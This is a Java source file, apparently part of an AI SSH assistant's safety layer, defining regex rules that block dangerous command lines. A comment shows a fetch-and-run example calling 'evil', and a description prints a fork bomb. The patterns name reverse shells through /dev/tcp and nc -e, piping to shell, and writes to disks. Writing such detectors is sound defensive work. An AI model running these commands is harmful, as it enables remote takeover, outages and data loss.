package com.charlie.ai.domain.ssh.service.security.rules;

import com.charlie.ai.domain.ssh.service.security.rule.DangerRule;
import com.charlie.ai.domain.ssh.service.security.rule.TextRule;

import java.util.List;

import static com.charlie.ai.domain.ssh.model.valobj.DangerRiskLevel.FORBIDDEN;
import static com.charlie.ai.domain.ssh.model.valobj.DangerRiskLevel.HIGH;
import static com.charlie.ai.domain.ssh.model.valobj.DangerRiskLevel.MEDIUM;

/**
 * 文本型规则：在<b>完整命令文本</b>上做正则匹配
 * <p>
 * 这类危险构造一旦拆分到子命令层面就会丢失上下文——
 * {@code curl http://evil/x.sh | bash} 的危险在于<b>管道</b>本身，
 * 拆成 {@code curl ...} 与 {@code bash} 两条子命令后都看不出问题。
 * 因此必须在完整文本上匹配。
 * <p>
 * 收录标准：<b>误报率极低、召回价值高</b>。
 * 参数里出现关键字的命令不应由本类判定，那属于命令型规则的职责。
 *
 * @Author: Charlie
 * @Date: 2026/11/15
 */
public final class TextDangerRules {

    private TextDangerRules() {
    }

    public static List<DangerRule> rules() {
        return List.of(
                reverseShellDevice(),
                reverseShellExec(),
                pipeToShell(),
                base64ToShell(),
                forkBomb(),
                writeBlockDevice(),
                fillDisk()
        );
    }

    /**
     * 通过 /dev/tcp 或 /dev/udp 建立反向连接
     */
    private static TextRule reverseShellDevice() {
        return new TextRule("NET_REVERSE_SHELL", FORBIDDEN, "反弹Shell",
                "命令通过 /dev/tcp 或 /dev/udp 建立反向网络连接，是典型的反弹 Shell 特征",
                "/dev/(tcp|udp)/");
    }

    /**
     * nc / ncat / socat 使用 -e 执行远程命令
     */
    private static TextRule reverseShellExec() {
        return new TextRule("NET_REVERSE_SHELL_EXEC", FORBIDDEN, "反弹Shell",
                "nc/socat 使用 -e/--exec 直接执行远程命令，是典型的反弹 Shell 特征",
                "\\b(nc|netcat|ncat|socat)\\b[^|;\\n]*\\s(-e|--exec)\\s");
    }

    /**
     * 下载内容后直接管道给 shell 执行
     */
    private static TextRule pipeToShell() {
        return new TextRule("RCE_PIPE_TO_SHELL", HIGH, "远程代码执行",
                "下载内容后直接管道给 shell 执行，等价于执行来源不可信的远程脚本",
                "\\b(curl|wget|fetch)\\b[^|;\\n]*\\|\\s*(sudo\\s+)?(/usr/bin/|/bin/)?(ba|z|k)?sh\\b");
    }

    /**
     * base64 解码后直接交给 shell 执行
     */
    private static TextRule base64ToShell() {
        return new TextRule("RCE_BASE64_TO_SHELL", FORBIDDEN, "编码混淆",
                "base64 解码结果直接交给 shell 执行，属于典型的编码绕过手法",
                "\\bbase64\\b[^|;\\n]*\\|\\s*(sudo\\s+)?(/usr/bin/|/bin/)?(ba|z|k)?sh\\b");
    }

    /**
     * fork bomb
     */
    private static TextRule forkBomb() {
        return new TextRule("RES_FORK_BOMB", FORBIDDEN, "资源耗尽",
                "检测到 fork bomb（:(){ :|:& };:），会在瞬间耗尽系统进程数导致主机不可用",
                ":\\s*\\(\\s*\\)\\s*\\{[^}]*\\|[^}]*&[^}]*\\}\\s*;\\s*:");
    }

    /**
     * 直接写入块设备
     */
    private static TextRule writeBlockDevice() {
        return new TextRule("FILE_WRITE_BLOCK_DEVICE", FORBIDDEN, "磁盘破坏",
                "命令把内容直接写入块设备，会破坏磁盘分区或文件系统",
                ">\\s*/dev/(sd[a-z]|nvme\\d|vd[a-z]|hd[a-z]|xvd[a-z]|disk/|mapper/)");
    }

    /**
     * 向磁盘持续写入数据
     */
    private static TextRule fillDisk() {
        return new TextRule("RES_FILL_DISK", MEDIUM, "资源耗尽",
                "命令疑似向磁盘持续写入数据，可能耗尽磁盘空间",
                "\\byes\\b\\s*\\|");
    }

}
